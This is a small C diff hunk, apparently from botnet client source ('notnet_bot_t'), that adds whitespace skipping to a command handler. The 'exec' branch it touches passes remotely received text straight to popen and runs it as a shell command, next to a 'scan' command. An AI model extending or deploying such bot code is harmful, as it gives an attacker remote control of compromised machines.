@@ -602,6 +602,8 @@ int protocol_process_commands(notnet_bot_t *bot) {
             log_info("CMD: scan");
         } else if (strncmp(cmd, CMD_EXEC, strlen(CMD_EXEC)) == 0) {
             char *args = cmd + strlen(CMD_EXEC);
+            /* Skip leading whitespace */
+            while (*args == ' ' || *args == '\t') args++;
             log_info("CMD: exec: %s", args);
             char output[1024] = {0};
             FILE *fp = popen(args, "r");
